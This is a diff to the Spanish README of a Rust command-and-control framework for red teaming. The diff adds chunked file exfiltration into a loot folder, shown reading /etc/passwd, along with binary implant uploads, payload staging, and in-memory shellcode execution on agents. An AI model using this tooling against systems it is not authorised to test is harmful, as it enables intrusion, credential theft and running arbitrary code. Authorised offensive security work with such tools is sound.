@@ -12,7 +12,11 @@ Framework de red teaming multi-plataforma en Rust. Tiene tres piezas: el agente 
 - **Sleep y jitter en caliente:** los cambias desde la TUI y el agente los aplica en el siguiente beacon, sin reiniciarlo.
 - **Se recupera solo:** si reinicias el C2, el agente ve el `404`, se vuelve a registrar y sigue.
 - **Plugins:** cada comando es un plugin estático. El `PluginRegistry` manda la tarea al primero que la soporte.
-- **Comandos incluidos:** `exec`, `info`, `whoami`, `hostname`, `pwd`, `ls`, `cd`, `help`.
+- **Comandos incluidos:** `exec`, `info`, `whoami`, `hostname`, `pwd`, `ls`, `cd`, `ps`, `shellcode`, `download`, `upload`, `help`.
+- **Transferencia de ficheros troceada:** descargas de hasta 64 MiB en chunks de 64 KiB, con reensamblado en `./loot` y verificación SHA-256 en cada punta. El agente no manda un fichero de golpe: lo parte y el C2 comprueba que llegaron todos los trozos antes de escribirlo.
+- **Implant de binarios:** subes un fichero al agente por chunks y él lo escribe en la ruta que le digas, comprobando el hash.
+- **Ciclo de vida de tareas:** cada tarea pasa por `queued → sent → completed/failed`, con hora de envío, hora de fin y duración en milisegundos. No se reenvía lo ya entregado.
+- **Versionado de protocolo:** el C2 rechaza agentes de otra versión con un mensaje claro, en vez de fallar al deserializar.
 - **TUI en rojo y negro:** lista de agentes, consola por agente, barra de comandos e historial con flechas.
 - **Builder:** compila el agente con URL, sleep, jitter, nombre y token embebidos. Cross-compila, por ejemplo Windows desde Linux.
 - **API HTTP:** `/register`, `/beacon`, `/results`, `/enqueue`, `/agents`, `/health`, por si quieres manejarlo desde otro cliente. Cuatro workers y bodies de hasta 1 MiB.
@@ -82,7 +86,14 @@ cargo run -p chamuko-c2 -- --port 8080 --token "$(openssl rand -hex 16)"
 cargo run -p chamuko-c2 -- --port 8080 --token "$TOKEN" --headless
 ```
 
-Opciones: `--listen <addr>` (por ejemplo `0.0.0.0:8080`), `--port <port>`, `--token <tok>` o `CHAMUKO_TOKEN`, `--headless`.
+Opciones: `--listen <addr>` (por ejemplo `0.0.0.0:8080`), `--port <port>`, `--token <tok>` o `CHAMUKO_TOKEN`, `--stage <file>`, `--headless`.
+
+`--stage` deja un fichero preparado para que un agente lo recoja con `implant`. Sirve para trabajar sin TUI:
+
+```bash
+cargo run -p chamuko-c2 -- --port 8080 --token "$TOKEN" --headless --stage ./payload.bin
+# imprime el id de transferencia, que luego pasas a: implant <transfer> <ruta-remota>
+```
 
 Sin token solo arranca en loopback. Con cualquier otra dirección se niega, para no dejar una API que ejecuta comandos abierta a la red.
 
@@ -130,7 +141,13 @@ El builder mete `CHAMUKO_C2_URL`, `CHAMUKO_SLEEP`, `CHAMUKO_JITTER`, `CHAMUKO_NA
 | `cd <dir>` | Cambiar de directorio |
 | `sleep <s>` | Cambiar el sleep (se aplica en el siguiente beacon) |
 | `jitter <s>` | Cambiar el jitter (se aplica en el siguiente beacon) |
+| `ps` | Lista los procesos del agente |
 | `shellcode <file>` | Manda shellcode XOR+base64 para ejecutarlo en memoria |
+| `download <path>` | Trae un fichero del agente a `./loot` |
+| `implant <local> <remoto>` | Sube un fichero local y lo escribe en el agente |
+| `tasks` | Historial de tareas con estado y duración |
+| `loot` | Ficheros recogidos, con tamaño y hash |
+| `staged` | Ficheros preparados esperando que el agente los pida |
 | `clear` | Reiniciar el scroll de la consola |
 | `help` | Ayuda |
 | `quit` o `Ctrl+C` | Salir |
@@ -141,11 +158,13 @@ Teclas: `←/→` o `Tab` para cambiar de agente, `↑/↓` para el historial, `
 
 | Método | Ruta | Qué hace |
 |--------|------|----------|
-| POST | `/register` | Registra un agente: `{agent, sleep?, jitter?}` → `{id, sleep, jitter}` |
+| POST | `/register` | Registra un agente: `{agent, sleep?, jitter?, protocol}` → `{id, sleep, jitter}` |
 | POST | `/beacon` | El agente pide tareas: `{id}` → `{tasks: [...], sleep, jitter}`. `404` si no lo conoce |
 | POST | `/results` | El agente manda resultados: `{id, results: [...]}`. `404` si no lo conoce |
 | POST | `/enqueue` | Encola una tarea: `{id, command, args}` → `{task_id}` |
-| GET | `/agents` | Agentes con estado, sleep y jitter |
+| POST | `/upload` | Trozo de fichero del agente: `{id, name, chunk}` → `{received, total, complete}` |
+| POST | `/download` | Trozo que el agente pide: `{transfer, index}` → `{chunk, sha256}` |
+| GET | `/agents` | Agentes con estado, sleep, jitter, protocolo y contador de tareas |
 | GET | `/health` | Health check, sin token |
 
 Todo menos `/health` pide `Authorization: Bearer <token>` cuando arrancas el C2 con `--token` o `CHAMUKO_TOKEN`. Sin token, solo acepta loopback.
@@ -158,6 +177,32 @@ curl -X POST http://127.0.0.1:8080/enqueue \
   -H 'Content-Type: application/json' \
   -d '{"id":"chamuko-0001","command":"exec","args":["whoami"]}'
 ```
+
+## Transferencia de ficheros
+
+Los ficheros viajan en chunks de 64 KiB, cada uno con su índice y el total. El receptor no escribe nada hasta tenerlos todos, así que un corte a mitad no deja un fichero corrupto en disco.
+
+**Bajar un fichero del agente**
+
+```
+download /etc/passwd
+```
+
+El agente lee el fichero, lo parte, y lo empuja con `POST /upload`. El C2 reensambla, calcula el SHA-256 y lo escribe en `./loot/<nombre>`. Si ya existe un fichero con ese nombre, añade un sufijo en vez de pisarlo. El nombre se sanea: `../../etc/passwd` acaba como `passwd` dentro de `loot/`, nunca fuera.
+
+Límite por descarga: 64 MiB. Por encima, el agente se niega y lo dice.
+
+**Subir un fichero al agente**
+
+```
+implant ./herramienta.bin /tmp/herramienta
+```
+
+El C2 parte el fichero, lo deja preparado, y encola una tarea `implant` con el id de transferencia. El agente pide los trozos con `POST /download`, los une, comprueba el hash y escribe el fichero. Si faltan directorios por medio, los crea.
+
+**Verificación**
+
+Ambas puntas calculan SHA-256 del contenido. El C2 lo guarda junto al loot; el agente lo imprime al escribir. Si los hashes no coinciden, algo se perdió por el camino y se ve de inmediato.
 
 ## Multi-plataforma
 
@@ -179,6 +224,8 @@ Lo que cambia según el sistema y ya está resuelto:
 ```bash
 cargo test --workspace
 ```
+
+Cubren el reensamblado de chunks (incluido el fichero vacío y los trozos desordenados), el saneado de nombres, el ciclo de vida de las tareas, el rechazo de versiones de protocolo distintas, y los comandos `ps`, `download` y `upload` contra ficheros reales en disco.
 
 ## Licencia
 
